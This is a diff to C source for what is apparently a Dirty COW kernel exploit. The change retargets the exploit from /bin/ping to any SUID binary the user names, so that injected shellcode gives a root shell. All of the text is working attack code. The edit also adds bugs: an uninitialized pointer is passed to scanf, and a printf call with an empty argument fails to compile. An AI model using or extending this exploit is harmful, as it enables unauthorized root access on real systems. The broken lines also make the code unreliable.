@@ -32,8 +32,7 @@
 #include <unistd.h>
 #include <crypt.h>
 
-const char *filename = "/bin/ping";
-const char *backup_filename = "/tmp/ping.bak";
+const char *backup_filename = "/tmp/dirtycow.bak";
 
 int f;
 void *map;
@@ -85,8 +84,16 @@ int copy_file(const char *from, const char *to) {
 
 int main(int argc, char *argv[])
 {
+  char *suid_file;
+  
+  if (argc >= 2) {
+    suid_file = argv[1];
+  } else {
+    printf("Enter the path to SUID binary:\n");
+    scanf("%s", suid_file);
+  }
   // backup file
-  int ret = copy_file(filename, backup_filename);
+  int ret = copy_file(suid_file, backup_filename);
   if (ret != 0) {
     exit(ret);
   }
@@ -109,7 +116,7 @@ int main(int argc, char *argv[])
   0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
 };
 
-  f = open(filename, O_RDONLY);
+  f = open(suid_file, O_RDONLY);
   fstat(f, &st);
   map = mmap(NULL,
              st.st_size + sizeof(long),
@@ -145,9 +152,9 @@ int main(int argc, char *argv[])
     pthread_join(pth,NULL);
   }
 
-  printf("Done! Check %s to see if the shell code has got injected.\n", filename);
-  printf("You can run '%s' to pop a root shell.\n\n", filename);
+  printf("Done! Check %s to see if the shell code has got injected.\n", );
+  printf("You can run '%s' to pop a root shell.\n\n", suid_file);
     printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",
-    backup_filename, filename);
+    backup_filename, suid_file);
   return 0;
 }
